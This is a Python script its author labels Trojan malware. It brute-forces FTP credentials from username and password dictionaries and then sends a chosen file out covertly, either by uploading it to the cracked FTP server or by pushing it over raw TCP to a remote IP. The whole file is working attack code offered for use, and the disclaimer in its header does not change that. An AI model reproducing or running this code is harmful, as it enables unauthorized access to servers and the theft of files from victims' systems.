#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 7th 2024
# Important Note:
#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
# these scripts. They are malicious and should only be used in professionally approved White Hat 
# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
# and if that repository is public, all the extracted data will be available for the whole world to see.
# Description of Script
# This script designed to facilitate secure and covert file transmission across networks. Utilizing 
# a combination of FTP brute force tactics and direct TCP/IP communication, ensures efficient and 
# discreet data transfer between endpoints. With platform compatibility for Windows, Linux, and macOS, 
# this script empowers users to transmit sensitive files with ease, offering a clandestine solution 
# for clandestine operations.
#################################################################################################
import ftplib
import os
import socket
import multiprocessing
import platform

def brute_force_ftp(username_dict, password_dict, server):
    """
    Function to perform brute force attack on FTP server using username and password dictionaries.
    
    Args:
        username_dict (str): Path to the username dictionary file.
        password_dict (str): Path to the password dictionary file.
        server (str): FTP server address.

    Returns:
        tuple: A tuple containing the successful username and password, or (None, None) if not found.
    """
    with open(username_dict, 'r') as u_file:
        usernames = u_file.read().splitlines()

    with open(password_dict, 'r') as p_file:
        passwords = p_file.read().splitlines()

    results = []

    def attempt_login(username, password):
        try:
            ftp = ftplib.FTP(server)
            ftp.login(username, password)
            print(f"FTP login successful with credentials: {username}/{password}")
            ftp.quit()
            results.append((username, password))
        except Exception as e:
            print(f"Failed login attempt: {username}/{password}")

    processes = []
    for username in usernames:
        for password in passwords:
            process = multiprocessing.Process(target=attempt_login, args=(username, password))
            processes.append(process)
            process.start()

    for process in processes:
        process.join()

    if results:
        return results[0]
    else:
        return None, None

def ftp_upload(docpath, server, username, password):
    """
    Function to upload a file to an FTP server.
    
    Args:
        docpath (str): Path to the file to be uploaded.
        server (str): FTP server address.
        username (str): FTP server username.
        password (str): FTP server password.
    """
    ftp = ftplib.FTP(server)
    ftp.login(username, password)
    ftp.cwd('/pub/')
    with open(docpath, "rb") as f:
        ftp.storbinary("STOR " + os.path.basename(docpath), f)
    ftp.quit()

def ftp_transmit(document_path, client_ip):
    """
    Function to transmit a file to a client via TCP/IP.
    
    Args:
        document_path (str): Path to the file to be transmitted.
        client_ip (str): IP address of the client.
    """
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_port = 10000
    try:
        client.connect((client_ip, client_port))
        with open(document_path, 'rb') as f:
            client.sendall(f.read())
        print("File transmitted successfully.")
    except Exception as e:
        print(f"Failed to transmit file: {e}")
    finally:
        client.close()

def automate_file_transmission(docpath, server, username_dict, password_dict, client_ip):
    """
    Function to automate file transmission based on provided parameters.
    
    Args:
        docpath (str): Path to the file to be transmitted.
        server (str): FTP server address.
        username_dict (str): Path to the username dictionary file.
        password_dict (str): Path to the password dictionary file.
        client_ip (str): IP address of the client.
    """
    # Attempt FTP brute force and upload if successful
    username, password = brute_force_ftp(username_dict, password_dict, server)
    if username and password:
        ftp_upload(docpath, server, username, password)
    else:
        print("FTP brute force unsuccessful. File transmission directly.")
        ftp_transmit(docpath, client_ip)

if __name__ == '__main__':
    docpath = "example_file.txt"  # Path to the file to be transmitted
    server = "ftp.example.com"    # FTP server address
    username_dict = "usernames.txt"   # Path to the username dictionary file
    password_dict = "passwords.txt"   # Path to the password dictionary file
    client_ip = "192.168.1.100"    # IP address of the client
    automate_file_transmission(docpath, server, username_dict, password_dict, client_ip)
